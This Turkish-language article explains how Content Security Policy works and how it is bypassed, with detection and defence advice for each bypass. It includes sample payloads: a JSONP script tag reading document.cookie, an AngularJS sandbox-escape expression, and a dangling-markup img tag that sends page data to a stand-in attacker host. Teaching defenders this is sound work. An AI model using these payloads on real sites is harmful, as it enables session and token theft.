# Content Security Policy (CSP) Tasarımı ve Bypass Teknikleri

## Giriş: CSP Neden Var, Sorun Ne?

XSS (Cross-Site Scripting) yıllardır web güvenliğinin en yaygın açığı. Kök neden hep aynı: tarayıcı, sayfanın kendi yazdığı script ile saldırganın enjekte ettiği script arasında ayrım yapamaz. `<script>` etiketi nereden geldiği önemsenmeden çalıştırılır. Girdi doğrulama (input validation) ve çıktı kodlama (output encoding) bu sorunu kaynakta çözmeye çalışır, ama büyük, karmaşık, çok-yazarlı (many contributors) uygulamalarda tek bir encoding hatası, tek bir unutulmuş kaçış (escaping) noktası tüm savunmayı deler. Bu yüzden savunma-derinliği (defense in depth) mantığıyla ikinci bir katman gerekti: uygulama mantığından bağımsız, tarayıcı seviyesinde çalışan bir "hangi kaynaktan gelen kod çalışabilir" politikası.

CSP tam olarak bu: sunucunun tarayıcıya bir HTTP başlığı (`Content-Security-Policy`) veya `<meta>` etiketiyle gönderdiği, "bu sayfada script/style/image/frame gibi kaynaklar sadece şu listeden yüklenebilir" diyen bir beyaz liste (allowlist) mekanizması. Doğru kurulmuş bir CSP, klasik `<script>alert(1)</script>` enjeksiyonunu XSS açığı hâlâ mevcutken bile etkisiz hâle getirebilir, çünkü tarayıcı o script bloğunu politika ihlali sayıp çalıştırmayı reddeder.

Ama CSP'nin kendisi de yanlış tasarlandığında sahte bir güvenlik hissi (false sense of security) üretir. Bu makalenin amacı, CSP'nin iç mantığını, tipik yapılandırma hatalarını, bilinen bypass sınıflarını ve bir mühendisin/savunmacının bunları nasıl tespit edip önleyeceğini derinlemesine anlatmak.

## CSP'nin Temel Çalışma Mantığı

CSP, direktif (directive) tabanlı bir dildir. Her direktif bir kaynak türünü kontrol eder:

- `script-src`: JavaScript kaynakları (en kritik direktif, XSS'in ana savunma hattı)
- `style-src`: CSS kaynakları
- `img-src`, `font-src`, `media-src`, `connect-src` (fetch/XHR/WebSocket hedefleri)
- `frame-src` / `frame-ancestors`: iframe içine alınabilme ve iframe açabilme (clickjacking ile de ilişkili)
- `object-src`: Flash/plugin tabanlı içerik (genelde `'none'` önerilir)
- `base-uri`: `<base>` etiketinin hedefini kısıtlar
- `default-src`: diğer `-src` direktifleri belirtilmemişse devreye giren yedek (fallback)

Her direktif için kaynak ifadeleri (source expressions) tanımlanır: `'self'`, belirli domainler (`https://cdn.example.com`), `'unsafe-inline'`, `'unsafe-eval'`, nonce'lar (`'nonce-rAnd0m'`), hash'ler (`'sha256-...'`), ve `'strict-dynamic'`.

**Kök mantık şu**: Tarayıcı, sayfa render edilirken her script/style/kaynak yükleme girişiminde "bu kaynak politikadaki listeyle eşleşiyor mu" diye kontrol eder. Eşleşmiyorsa yüklemeyi engeller ve (varsa) `report-uri`/`report-to` direktifine ihlal raporu gönderir. Bu, tamamen tarayıcı tarafında çalışan, uygulama kodundan bağımsız bir zorlama (enforcement) katmanıdır — yani uygulamanın HTML'i yanlışlıkla saldırgan script'ini basıyor olsa bile, tarayıcı o script'i politikaya uymadığı için çalıştırmaz.

### `unsafe-inline` Tuzağı: En Yaygın Hata

En sık görülen CSP hatası, `script-src 'self' 'unsafe-inline'` gibi bir politika yazmaktır. Buradaki kök neden anlaşılır: geliştiriciler mevcut kod tabanında onlarca `<script>...</script>` inline bloğu ve `onclick="..."` gibi olay işleyicileri (event handler) olduğunu görür, bunları nonce/hash ile değiştirmek yerine `'unsafe-inline'` ekleyip "CSP'yi çalışır hâle getirir". Ama `'unsafe-inline'` tam olarak CSP'nin önlemeye çalıştığı şeyi — *her* inline script'in çalışmasına izin verir. XSS payload'u da bir inline script olduğundan, bu ayar CSP'yi XSS'e karşı fiilen işlevsiz kılar. `'unsafe-inline'` sadece clickjacking benzeri bazı ikincil koruma katmanlarında (örn. `style-src`'de sınırlı risk) kabul edilebilir, `script-src`'de neredeyse hiçbir zaman doğru tercih değildir.

Benzer şekilde `'unsafe-eval'`, `eval()`, `new Function()`, `setTimeout(string)` gibi string'den kod üreten API'lere izin verir; bunlar da saldırganın DOM'a enjekte ettiği veriyi kod olarak çalıştırabileceği ikinci bir kapıdır.

**Tespit**: Statik olarak politika metninde `unsafe-inline` veya `unsafe-eval` aranması (CI/CD güvenlik lint kuralı olarak), veya tarayıcı `SecurityPolicyViolationEvent` raporlarının incelenmesi. **Savunma**: Inline script'leri dış dosyalara taşımak (external `.js` dosyaları `'self'` ile zaten izinlidir) ya da nonce/hash stratejisine geçmek.

## Nonce ve Hash Tabanlı Yaklaşım

Modern CSP tasarımının merkezinde iki teknik var: **nonce** (number used once) ve **hash**.

**Nonce yaklaşımı**: Sunucu her HTTP yanıtında rastgele, tahmin edilemez, kriptografik olarak güçlü bir token üretir (örn. 128-bit rastgelelik, base64 kodlanmış). Bu token hem CSP başlığına (`script-src 'nonce-rAnd0mBase64Value'`) hem de izin verilecek her `<script nonce="rAnd0mBase64Value">` etiketine yazılır. Tarayıcı, sadece doğru nonce değerine sahip script bloklarını çalıştırır.

**Kök neden/mantık**: Saldırganın enjekte ettiği script'in geçerli nonce'u bilmesi mümkün değildir, çünkü nonce her istek (request) için yeniden üretilir ve HTML kaynağı dışında hiçbir yerde tutulmaz. Saldırgan HTML enjeksiyonu yapabilse bile (örn. reflected XSS ile), kendi `<script>` etiketine doğru nonce'u ekleyemez — çünkü o nonce'u ancak sunucu tarafı render sırasında görebilir, ki saldırganın kodu sunucu tarafında çalışmıyordur.

**Kritik gereksinimler (aksi hâlde nonce anlamsızlaşır)**:
1. Nonce her istekte **yeniden** üretilmeli. Statik/sabit bir nonce kullanmak (örn. build zamanında gömülü sabit değer) nonce'u işe yaramaz kılar, çünkü saldırgan sayfa kaynağını görüp aynı nonce'u kendi enjekte ettiği script'e kopyalayabilir.
2. Nonce, kriptografik RNG (rastgele sayı üreteci) ile üretilmeli — tahmin edilebilir bir sayaç veya zayıf PRNG kullanılırsa saldırgan bir sonraki nonce'u tahmin edebilir.
3. Nonce sızıntısına dikkat: nonce değeri HTML kaynağında zaten görünür durumda olduğundan, eğer sayfada saldırganın kontrol edebileceği bir HTML enjeksiyon noktası + o noktadan nonce'u okuyup kullanabileceği bir DOM XSS zinciri varsa (örn. `document.querySelector('script').nonce` okunabiliyorsa ve bu değer bir yere yansıtılıyorsa), nonce dolaylı yoldan sızabilir. Bu nadir ama bilinen bir zincir.

**Hash yaklaşımı**: Sunucu belirli bir inline script bloğunun tam içeriğinin SHA-256/384/512 hash'ini hesaplar ve CSP'ye `'sha256-<base64hash>'` olarak ekler. Tarayıcı, çalıştırmadan önce script içeriğinin hash'ini alır, politikadaki listeyle karşılaştırır. Hash yaklaşımı, script içeriği hiç değişmeyen statik inline bloklar için idealdir (nonce üretmeye gerek kalmaz), ama her karakterin birebir eşleşmesi gerektiğinden dinamik/parametrik inline script'lerde kullanışsız — script içeriği bir karakter bile değişse hash uyuşmaz.

## `strict-dynamic`: Neden Eklendi, Nasıl Çalışır

Nonce/hash yaklaşımının pratikte karşılaştığı sorun şu: büyük uygulamalarda script'ler genelde bir ana script'ten dinamik olarak başka script'ler yükler (örn. bir analytics kütüphanesi kendi alt modüllerini `document.createElement('script')` ile ekler). Klasik CSP modelinde, bu şekilde dinamik olarak DOM'a eklenen her script için de ayrı ayrı nonce/hash/domain listesi gerekirdi — bu da uygulamayı domain allowlist'i sürekli genişletmeye, dolayısıyla "geniş whitelist = geniş saldırı yüzeyi" durumuna iter (JSONP endpoint'i olan bir CDN domaini allowlist'e girerse, az sonra göreceğimiz gibi bypass kapısı açılır).

`'strict-dynamic'` bu sorunu şöyle çözer: Bir script'e nonce veya hash ile güven verildiğinde, o script'in **kendisinin** DOM'a eklediği başka script'lere de otomatik olarak güven aktarılır (güven zinciri / trust propagation), domain bazlı allowlist'e bakılmaksızın. Mantık: "Ben zaten hangi script'lerin ilk elden güvenilir olduğunu nonce/hash ile doğruladım; o güvenilir script'in çalışma zamanında yarattığı script de güvenilir sayılsın, ayrı ayrı domain izni vermeme gerek yok."

`'strict-dynamic'` kullanıldığında, `'strict-dynamic'`'i destekleyen tarayıcılarda domain tabanlı kaynak listeleri (`https://cdn.example.com` gibi) **yok sayılır** — bu kasıtlı bir tasarım: geriye dönük uyumluluk için eski tarayıcılara domain listesi de yazılır, ama `strict-dynamic` destekleyen modern tarayıcı bunu görmezden gelip sadece nonce/hash zincirine güvenir. Bu da domain allowlist tabanlı bypass'ları (aşağıda JSONP örneği) otomatik olarak kapatır.

**Doğru yapılandırma örneği (kavramsal)**:
```
Content-Security-Policy:
  script-src 'nonce-<random>' 'strict-dynamic' https:;
  object-src 'none';
  base-uri 'none';
```
Buradaki `https:` sadece nonce/hash desteklemeyen çok eski tarayıcılar için bir yedek (fallback) — `strict-dynamic` destekleyen tarayıcılar bunu yok sayar.

## Bypass Sınıf 1: Allowlist'teki Geniş/Güvenilmeyen Domainler (JSONP Bypass)

**Kök neden**: `script-src` politikasına "güvenilir" sayılan bir CDN veya üçüncü taraf domaini (`https://某cdn.com`) eklendiğinde, o domain üzerinde host edilen **her** script CSP açısından güvenilir sayılır — CSP domain seviyesinde çalışır, dosya/path seviyesinde değil (path bazlı kısıtlama tarayıcı desteğinde tutarsız olduğu ve genelde önerilmediği için).

Eğer o domain üzerinde bir JSONP endpoint'i varsa (callback parametresi ile isteğe bağlı JS fonksiyon adı döndüren eski bir API deseni, örn. `https://cdn.com/api?callback=alert(1)//`), saldırgan bu URL'yi `script-src`'e izinli domain altında bir `<script src="https://cdn.com/api?callback=alert(document.cookie)//">` olarak enjekte edebilir. Tarayıcı açısından bu script domain listesindeki izinli bir kaynaktan geliyor, dolayısıyla CSP ihlali oluşmaz — ama içeriği saldırganın belirlediği JS kodudur.

**Neden çalışır (kavramsal zincir)**: CSP "nereden" sorusuna cevap veriyor, "ne" sorusuna değil. Domain güvenilir olsa bile o domain üzerindeki *her* endpoint güvenli değildir; büyük CDN'lerin/servis sağlayıcıların geniş yüzeyinde (örn. kullanıcı tarafından yüklenebilen dosyalar, open redirect'ler, JSONP API'leri, AMP cache'leri) saldırganın kontrol edebileceği bir "script gibi davranan" endpoint bulunması olasıdır.

**Tespit**: Allowlist'teki her domain için "bu domainde kullanıcı kontrollü içerik barındıran, script olarak yorumlanabilecek bir endpoint var mı" sorusunu manuel/otomatik taramayla sormak. Bilinen JSONP endpoint listeleri (topluluk tarafından derlenen "CSP bypass domain" listeleri) ile karşılaştırma.

**Savunma**: Mümkün olduğunca domain tabanlı allowlist yerine nonce/hash + `strict-dynamic` kullanmak. Zorunlu olarak üçüncü taraf domaini eklenecekse, o domainin tam olarak hangi path'leri sunduğunu ve JSONP/kullanıcı-üretimi-içerik barındırıp barındırmadığını denetlemek.

## Bypass Sınıf 2: Framework Gadget'ları (AngularJS Örneği)

**Kök neden**: CSP script kaynağını kısıtlar ama sayfada zaten yüklü, CSP tarafından izinli bir framework/kütüphane varsa ve bu framework kendi şablon dilini (template language) çalışma zamanında HTML içinden okuyup değerlendiriyorsa (örn. `{{constructor.constructor('alert(1)')()}}` gibi ifadeler), saldırgan yeni bir `<script>` etiketi enjekte etmeden, framework'ün zaten sahip olduğu "ifade değerlendirme" (expression evaluation) yeteneğini kötüye kullanarak kod çalıştırabilir.

Eski AngularJS sürümlerinde (Angular değil, AngularJS/1.x) şablon enjeksiyonu (template injection/sandbox escape) bu şekilde CSP'yi atlatmak için klasik bir gadget olarak bilinir: sayfa zaten CSP-izinli olarak Angular'ı yüklemiştir, saldırgan yeni script eklemez, sadece Angular'ın `ng-app` kapsamındaki bir DOM alanına Angular ifadesi enjekte eder; Angular bunu kendi (CSP'ye tabi olmayan, çünkü zaten yüklü kod içinde çalışan) yorumlayıcısıyla değerlendirir.

**Neden çalışır**: CSP yeni script *kaynaklarının* yüklenmesini engeller, ama sayfada zaten çalışan, izinli koddaki bir yorumlayıcı/`eval`-benzeri mekanizmanın davranışını kontrol edemez. Bu "gadget'lı framework problemi" olarak bilinir — CSP'nin göremediği, uygulama mantığı içindeki dinamik değerlendirme noktaları.

**Tespit**: Sayfada template injection/expression injection test payload'ları (`{{7*7}}`, `${7*7}` gibi) enjekte edilip yansıyıp yansımadığının kontrolü; kullanılan framework sürümünün bilinen sandbox-escape zincirlerine karşı güncel olup olmadığının denetimi.

**Savunma**: Güncel framework sürümleri kullanmak (modern Angular sürümleri bu tarz sandbox'ları kaldırıp derleme-zamanı şablon derlemesine geçti); kullanıcı girdisinin şablon bağlamına (template context) hiç ulaşmamasını sağlamak; mümkünse `trusted-types` direktifi ile DOM XSS sink'lerini (örn. `innerHTML`) tarayıcı seviyesinde kısıtlamak.

## Bypass Sınıf 3: Iframe ile CSP'yi Dolaylı Atlatma

**Kök neden**: `script-src` bir sayfanın *kendi* bağlamında hangi script'lerin çalışacağını kısıtlar, ama sayfa saldırganın kontrolündeki bir origin'i `<iframe>` olarak açabiliyorsa (yani `frame-src`/`child-src` politika olarak izin veriyorsa, ya da CSP hiç `frame-src` tanımlamadıysa), o iframe kendi origin'inde, kendi (saldırganın belirlediği) CSP'siyle çalışır. Ana sayfanın CSP'si, iframe'in **içine** sızmaz.

Bunun kendisi doğrudan "ana sayfada kod çalıştırma" anlamına gelmez — origin izolasyonu (same-origin policy) hâlâ geçerlidir — ama saldırganın amacı genelde farklıdır: kullanıcıyı kandırmak (phishing benzeri UI enjeksiyonu), `postMessage` ile ana sayfaya mesaj göndermeye çalışmak (ana sayfa `postMessage` mesajlarını yeterince doğrulamıyorsa bu ayrı bir açık olur), ya da CSP'nin `frame-ancestors` direktifi eksikse ana sayfayı **kendi** sayfasına gömüp clickjacking yapmaktır (bu, CSP'nin script kısıtlamasından ayrı, `frame-ancestors`/`X-Frame-Options` eksikliğiyle ilgili bir konudur, ama sık karıştırılır).

**Tespit**: `frame-src`/`child-src`'in `'self'` veya belirli güvenilir origin'lerle sınırlı olup olmadığı; `frame-ancestors`'ın `'none'` veya `'self'` olarak ayarlanıp ayarlanmadığı.

**Savunma**: `frame-src 'self'` (veya gerçekten gerekiyorsa açıkça listelenen origin'ler); `frame-ancestors 'self'`; iframe içinden gelen `postMessage` mesajlarında `event.origin` kontrolü.

## Bypass Sınıf 4: Dangling Markup Injection

**Kök neden**: CSP script çalıştırmayı engelleyebilir ama saldırganın HTML enjekte edebildiği (fakat script çalıştıramadığı) durumlarda bile veri sızdırma (exfiltration) hâlâ mümkün olabilir. "Dangling markup" (sarkık/eksik kapatılmış işaretleme), saldırganın kapanmamış bir HTML özniteliği (attribute) açması ve bu özniteliğin, sayfanın geri kalanındaki hassas veriyi (örn. bir CSRF token'ı, bir sonraki kullanıcı verisi) kendi kontrolündeki bir sunucuya `src`/`href` gibi bir öznitelik değeri olarak "yutmasını" sağlamasıdır.

**Kavramsal örnek mantığı**: Saldırgan `<img src="https://saldirgan.com/log?data=` gibi kapatılmamış bir `<img src="...">` enjekte eder. Tarayıcı HTML parse ederken bu özniteliği, kapanış tırnağı görene kadar sayfanın **geri kalanını** (o noktadan sonraki tüm HTML'i, hatta bazen sonraki bir gizli input değerini) `src` değerinin parçası sanır ve bunu saldırganın sunucusuna bir GET isteğiyle gönderir. Bu, `<script>` çalıştırmadan, sadece HTML parser'ın davranışını kötüye kullanarak veri sızdırma sağlar — dolayısıyla CSP'nin `script-src` kısıtlaması bunu doğrudan engellemez, çünkü hiçbir script çalışmamıştır; sadece bir `<img>`/`<link>`/`<base>` gibi pasif kaynak yükleme etiketi kullanılmıştır.

**CSP'nin buradaki kısmi savunması**: `img-src`, `default-src` gibi direktifler saldırganın sunucusuna giden isteği de kısıtlayabilir (eğer allowlist dardır ve saldırganın domaini listede değilse istek zaten engellenir). Bu yüzden `img-src`/`connect-src`'i de `'self'` veya dar bir listeyle sınırlamak, sadece `script-src`'e odaklanmaktan daha bütüncül bir savunma sağlar. Ayrıca `base-uri 'none'` (veya `'self'`), `<base href="...">` enjeksiyonu üzerinden yapılan bir dangling markup türevini (tüm göreli URL'lerin saldırgan domainine yönlendirilmesi) engeller.

**Tespit**: HTML enjeksiyon noktalarında kapanmamış öznitelik denemeleri (fuzzing) ile veri sızıp sızmadığının test edilmesi; response header'da `img-src`/`connect-src`/`base-uri`'nin dar olup olmadığının incelenmesi.

## Diğer Yaygın Yapılandırma Hataları

**`report-uri` yerine sadece izleme, zorlama yok**: `Content-Security-Policy-Report-Only` başlığı politikayı zorlamaz, sadece ihlalleri raporlar. Bu, yeni bir politikayı üretime almadan önce test etmek için doğru bir araçtır, ama yanlışlıkla kalıcı olarak `Report-Only` modda bırakılan bir CSP hiçbir koruma sağlamaz — sadece gözlemler.

**`default-src` eksikliği ve direktif miras almama**: Her `-src` direktifi bağımsızdır; `script-src` tanımlanmışsa ama `object-src` tanımlanmamışsa ve `default-src` de yoksa, `object-src` sınırsız kalır (yani Flash/eski plugin tabanlı vektörler hâlâ açık olabilir). Kök neden: geliştiriciler "script-src'i kısıtladım, CSP'm var" diye düşünüp diğer direktifleri unutur. **Savunma**: Her zaman `object-src 'none'` ve `base-uri 'none'`/`'self'` açıkça yazmak, `default-src 'self'` ile güvenli bir taban belirlemek.

**Meta etiketiyle CSP tanımlama sınırlamaları**: `<meta http-equiv="Content-Security-Policy">` kullanmak, gerçek bir HTTP başlığından daha zayıftır — `frame-ancestors`, `report-uri` gibi bazı direktifler `<meta>` içinde desteklenmez, ve saldırgan sayfanın `<head>`'ine enjeksiyon yapabiliyorsa (nadiren ama mümkün) politikayı manipüle edebilir. Gerçek HTTP header tercih edilmelidir.

**Çoklu CSP başlığının kesişimi**: Bir yanıt birden fazla `Content-Security-Policy` başlığı içeriyorsa (örn. bir reverse proxy ve uygulama sunucusu ayrı ayrı ekliyorsa), tarayıcı bunların **kesişimini** (en kısıtlayıcı ortak küme) uygular, birleşimini değil. Bu, farkında olmadan iki farklı ekibin CSP'sinin birbirini bozmasına (örn. birinin gerekli bir domain'i açması, diğerinin genel olarak kısıtlaması) yol açabilir. **Tespit**: Yanıt başlıklarının tamamının (proxy dahil) tek bir yerden kontrol edilmesi.

## Trusted Types: Bir Sonraki Katman

Nonce/hash/`strict-dynamic` script *kaynağını* (nereden geldiğini) kontrol eder ama DOM tabanlı XSS'in bir kısmı script etiketi eklemeden, doğrudan `innerHTML`, `document.write`, `location.href` gibi "tehlikeli havuzlara" (dangerous sink) string yazarak oluşur. `Trusted Types` direktifi (`require-trusted-types-for 'script'`), bu sink'lere yazılabilecek değerlerin sadece uygulamanın tanımladığı, denetlenebilir bir "policy" fonksiyonundan geçmiş nesneler olmasını zorunlu kılar. Bu, CSP ailesinin DOM XSS'e karşı en yeni ve en güçlü savunma katmanıdır, ancak tarayıcı desteği ve mevcut kod tabanına uyarlama maliyeti hâlâ önemli bir benimseme engelidir.

## Sonuç: Savunmacı İçin Kontrol Listesi Mantığı

CSP'yi değerlendirirken sorulması gereken temel sorular şunlardır: `script-src`'de `'unsafe-inline'` veya `'unsafe-eval'` var mı (varsa öncelik #1 düzeltme budur); nonce kullanılıyorsa her istekte yeniden üretiliyor mu; domain allowlist'i mümkün olduğunca dar mı ve `strict-dynamic` ile mi destekleniyor; `object-src` ve `base-uri` açıkça kısıtlanmış mı; `frame-ancestors` ve `frame-src` tanımlı mı; politika gerçek bir HTTP başlığı mı yoksa sadece Report-Only mu; ve son olarak, allowlist'e eklenen her üçüncü taraf domain gerçekten CSP açısından güvenilir mi (JSONP/açık yönlendirme/kullanıcı içeriği barındırma riski var mı).

CSP tek başına bir XSS önleme aracı değil, XSS'in **etkisini sınırlayan** bir savunma-derinliği katmanıdır. Asıl birincil savunma yine doğru çıktı kodlama ve güvenli DOM API kullanımıdır; CSP, o birincil savunma bir şekilde delindiğinde devreye giren ikinci hat olarak tasarlanmalı ve bu makalede anlatılan tuzaklardan kaçınacak şekilde sıkı yapılandırılmalıdır.
